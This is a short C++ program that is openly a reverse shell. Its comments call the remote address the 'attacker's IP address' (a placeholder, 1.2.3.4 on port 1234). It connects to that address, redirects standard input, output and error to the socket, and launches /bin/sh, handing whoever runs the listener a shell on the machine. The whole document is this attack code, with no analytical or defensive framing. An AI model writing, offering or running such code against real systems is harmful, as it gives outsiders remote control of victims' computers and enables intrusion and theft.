#include <iostream>
#include <string>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>

int main() {
  // Create a socket
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);

  // Specify the attacker's IP address and port
  struct sockaddr_in serv_addr;
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(1234);
  serv_addr.sin_addr.s_addr = inet_addr("1.2.3.4");

  // Connect to the attacker's computer
  connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

  // Redirect standard input, output, and error to the socket
  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  // Execute a shell on the target computer
  system("/bin/sh");

  return 0;
}
